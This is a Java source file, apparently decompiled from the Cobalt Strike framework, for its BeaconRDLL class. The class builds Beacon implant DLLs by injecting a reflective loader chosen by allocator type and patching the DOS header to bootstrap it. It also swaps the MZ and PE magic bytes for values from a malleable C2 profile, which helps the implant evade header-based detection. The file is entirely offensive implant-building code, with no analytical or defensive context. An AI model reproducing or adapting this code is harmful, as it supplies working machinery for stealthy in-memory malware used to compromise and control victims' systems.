package pe;

import c2profile.Profile;
import common.AssertUtils;
import common.CommonUtils;
import common.DevLog;
import common.ReflectiveDLL;
import common.SleevedResource;

public class BeaconRDLL {
   protected Profile profile;
   protected String arch;
   protected byte[] MZ_header;
   protected byte[] PE_header;

   public BeaconRDLL(Profile var1, String var2) {
      this.profile = var1;
      this.arch = var2;
      AssertUtils.TestArch(var2);
      this.MZ_header = var1.getStringAsBytes(".stage.magic_mz_" + var2);
      this.PE_header = var1.getStringAsBytes(".stage.magic_pe");
   }

   public byte[] getPatch(int var1) {
      if ("x86".equals(this.arch)) {
         return BeaconLoader.getDOSHeaderPatchX86(this.MZ_header, var1);
      } else {
         return "x64".equals(this.arch) ? BeaconLoader.getDOSHeaderPatchX64(this.MZ_header, var1) : new byte[0];
      }
   }

   public String getLoaderFile() {
      String var1 = this.profile.getString(".stage.allocator");
      String var2 = "";
      if ("HeapAlloc".equals(var1)) {
         var2 = "resources/BeaconLoader.HA." + this.arch + ".o";
      } else if ("MapViewOfFile".equals(var1)) {
         var2 = "resources/BeaconLoader.MVF." + this.arch + ".o";
      } else {
         var2 = "resources/BeaconLoader.VA." + this.arch + ".o";
      }

      return var2;
   }

   protected byte[] getReflectiveLoaderFunction() {
      String var1 = "getReflectiveLoaderFunction";
      DevLog.log(DevLog.STORY.CS0217, this.getClass(), var1, "=============================== " + this.getLoaderFile());
      byte[] var2 = SleevedResource.readResource(this.getLoaderFile());
      OBJExecutableSimple var3 = new OBJExecutableSimple(var2);
      var3.parse();
      var3.processRelocations();
      if (var3.hasErrors()) {
         CommonUtils.print_error("RDLL parser errors:\n" + var3.getErrors());
         throw new RuntimeException("Can't parser rDLL loader file:\n" + var3.getErrors());
      } else {
         AssertUtils.TestRange(var3.getCodeSize(), 1024, 5120);
         byte[] var4 = var3.getCode();
         byte[] var5 = new byte[5120];

         for(int var6 = 0; var6 < 5120; ++var6) {
            var5[var6] = var4[var6 % var4.length];
         }

         DevLog.log(DevLog.STORY.CS0217, this.getClass(), var1, "Returning reflective loader with code length: " + var4.length);
         return var5;
      }
   }

   protected void fixLoaderPE(byte[] var1) {
      if ((this.PE_header[0] != 80 || this.PE_header[1] != 69) && this.PE_header.length == 2) {
         byte[] var2 = new byte[0];
         byte[] var3 = new byte[0];
         if ("x86".equals(this.arch)) {
            var2 = new byte[]{80, 69, 0, 0, 117, 2};
            var3 = new byte[]{this.PE_header[0], this.PE_header[1], 0, 0, 117, 2};
         } else if ("x64".equals(this.arch)) {
            var2 = new byte[]{80, 69, 0, 0, 117, 2};
            var3 = new byte[]{this.PE_header[0], this.PE_header[1], 0, 0, 117, 2};
         }

         CommonUtils.patch(var1, var2, var3);
      }

   }

   protected void fixLoaderMZ(byte[] var1) {
      if (this.MZ_header.length >= 2 && (this.MZ_header[0] != 77 || this.MZ_header[1] != 90)) {
         byte[] var2 = new byte[0];
         byte[] var3 = new byte[0];
         if ("x86".equals(this.arch)) {
            var2 = new byte[]{77, 90, 0, 0, 117};
            var3 = new byte[]{this.MZ_header[0], this.MZ_header[1], 0, 0, 117};
         } else if ("x64".equals(this.arch)) {
            var2 = new byte[]{77, 90, 0, 0, 117};
            var3 = new byte[]{this.MZ_header[0], this.MZ_header[1], 0, 0, 117};
         }

         CommonUtils.patch(var1, var2, var3);
      }

   }

   protected void setPE(PEParser var1, byte[] var2) {
      if (this.PE_header[0] != 80 || this.PE_header[1] != 69) {
         int var3 = var1.getLocation("header.PE");
         var2[var3 + 0] = this.PE_header[0];
         var2[var3 + 1] = this.PE_header[1];
      }

   }

   public byte[] process(byte[] var1) {
      PEParser var2 = PEParser.load(var1);
      int var3 = ReflectiveDLL.findReflectiveLoader(var2);
      byte[] var4 = this.getPatch(var3);
      byte[] var5 = this.getReflectiveLoaderFunction();
      this.fixLoaderMZ(var5);
      this.fixLoaderPE(var5);
      this.setPE(var2, var1);
      ReflectiveDLL.setReflectiveLoader(var2, var1, var5);
      CommonUtils.memcpy(var1, var4, var4.length);
      if ("x64".equals(this.arch)) {
         AssertUtils.Test(var2.is64(), "Asked to provide x64 patch to x86 Beacon DLL");
      } else {
         AssertUtils.Test(!var2.is64(), "Asked to provide x86 patch to x64 Beacon DLL");
      }

      boolean var10000 = var4.length <= 60;
      String var10001 = this.arch;
      AssertUtils.Test(var10000, var10001 + " DOS header is too big. Expect a crash");
      AssertUtils.Test(var3 > 0, "Could not find ReflectiveLoader export in DLL");
      return var1;
   }
}
